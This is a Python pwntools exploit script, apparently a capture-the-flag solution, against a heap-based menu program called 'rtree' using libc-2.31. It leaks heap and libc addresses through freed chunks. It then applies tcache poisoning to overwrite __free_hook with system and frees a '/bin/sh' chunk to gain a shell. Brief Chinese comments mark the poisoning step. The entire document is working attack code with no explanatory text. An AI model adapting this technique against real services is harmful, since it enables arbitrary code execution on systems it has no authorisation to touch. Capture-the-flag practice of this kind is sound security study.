from pwn import *

context(arch="amd64", os="linux", log_level="debug")
# p=process('./rtree')
p = remote("localhost", 10000)
libc = ELF("./libc-2.31.so")


def insert(key, siz, data):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil("key\n")
    p.sendline("%d" % key)
    p.recvuntil("size of the data\n")
    p.sendline("%d" % siz)
    p.recvuntil("enter the data\n")
    p.send(data)


def show(key):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("to show\n")
    p.sendline("%d" % key)


def remove(key):
    p.recvuntil(">> ")
    p.sendline("3")
    p.recvuntil("to remove\n")
    p.sendline("%d" % key)


def edit(key, data):
    p.recvuntil(">> ")
    p.sendline("4")
    p.recvuntil("its data\n")
    p.sendline("%d" % key)
    p.recvuntil("enter the new data\n")
    p.send(data)


insert(2, 0x10, "A" * 0x10)
insert(4, 0x30, "rrr")
insert(3, 0x30, "rrr")
insert(5, 0x30, "rrr")
insert(6, 0x450, "rrr")
insert(1, 0x450, "B" * 0x4)
insert(1, 0x10, "C" * 0x10)

remove(6)
remove(3)
remove(5)
remove(4)
remove(1)

# gdb.attach(p)
show(0)
p.recvuntil("is: \n")
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
p.recv(2)
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(heap_leak))
print(hex(libc_leak))
# gdb.attach(p)
# 0x55e9fea3d4b0 0x55e9fea3d000 0x7f3786b45be0 0x7f3786959000
libc_base = libc_leak - 0xB45BE0 + 0x959000
heap_base = heap_leak - 0x4B0
# 再来打一个 tcache poisoning
print(hex(libc_base))
print(hex(heap_base))

insert(9, 0x80, "rrr")
insert(9, 0x100, "ttt")
insert(6, 0x30, "rrr")
insert(3, 0x30, "rrr")
insert(5, 0x30, "rrr")
insert(7, 0x30, "rrr")
insert(4, 0x80, "rrr")

remove(4)
remove(5)
remove(3)
remove(7)
remove(6)

remove(9)
# gdb.attach(p)
# 此时key 是 heap_base+0x400->int
edit((heap_base + 0x3F0) & 0xFFFFFFFF, p64(libc_base + libc.symbols["__free_hook"]))

insert(4, 0x80, "/bin/sh\x00")
insert(5, 0x80, p64(libc_base + libc.symbols["system"]))
remove(4)
p.interactive()
